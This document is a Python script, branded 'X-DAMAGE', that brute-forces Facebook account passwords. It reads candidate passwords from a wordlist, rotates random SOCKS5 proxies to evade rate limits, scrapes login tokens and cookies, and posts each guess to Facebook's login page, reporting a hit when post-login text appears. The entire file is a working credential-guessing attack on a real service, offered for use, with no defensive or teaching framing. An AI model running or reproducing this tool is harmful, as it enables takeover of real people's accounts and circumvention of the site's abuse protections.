import requests
import random
from bs4 import BeautifulSoup

print("                                                  ********************************                                                 ")
print("                                                  *                              *                                                 ")
print("                                                  *          X-DAMAGE            *                                                 ")
print("                                                  *                              *                                                 ")
print("                                                  ********************************                                                 ")
print("                                                                                                       By mr. shubham(*_*)")
print("                                           ")
print("-------------------------------------------------------YOUR CODE STARTS------------------------------------------------------------")
print("-----------------------------------------------------------------------------------------------------------------------------------")
url='https://www.facebook.com/login.php'
#url=input("please enter here your target url :--")
print("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
#print("-----------------------------------------------------------------------------------------------------------------------------------")
username=input("please enter your email or username :--")
print("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
h = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}
P = {}
c = {}
def proxy():
        with open('socks5.txt', 'r+') as f:
            p= [line.strip() for line in f]
            a=len(p)
            b=random.randrange(0,a)
            proxy_index=p[b]
            proxy = {"http://": proxy_index,  "https://": proxy_index}
#            print("------------------------------------------------------------------------------------------")
#            print("ckecking for working proxy-")
#            print("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
            return proxy


def create_form():
    form = dict()
    cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}

    d = requests.get(url, proxies=proxy(), headers=h)
    if d.status_code==200:
        #print(proxy() , end="")
        #print(" is working")
    
        for i in d.cookies:
            cookies[i.name] = i.value
        d = BeautifulSoup(d.text, 'html.parser').form
        
        if d.input['name'] == 'lsd':
            form['lsd'] = d.input['value']
        return form, cookies
    else:
#        print("------------------------------------------------------------------------------------")
#        print(proxy() ,end="")
#        print(" is not working--")
#        print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
        create_form()
    


def is_this_a_password(email, index, password):
    global P, c
    if index % 10 == 0:
        P, c = create_form()
        P['email'] = username
    P['pass'] = password
 #   print("--------------------------------------------------------------------------------------------------------")
 #   print("userinfo and cookies are ready----")
 #   print("now going to attack-----")
 #   print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")


    r = requests.post(url, proxies=proxy(),data=P,  cookies=c, headers=h)
    if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
        open('temp', 'w').write(str(r.content))
        print('\npassword found is: ', password)
        return True
    return False

print("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
print("------------------------------------------------------------------BRUTEFORCE STARTS----------------------------------------------------------------")
print("****************************************************************######################**************************************************************")
if __name__ == "__main__":
    password_data = open('password.txt', 'r').read().split("\n")
    for index, password in zip(range(password_data.__len__()), password_data):
        password = password.strip()
        print("--------------------------------------------------------------------------------------------------------------------------------------------")
        print("Trying password [", index, "]: ", password)
        #print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
        if is_this_a_password(username, index, password):
            break
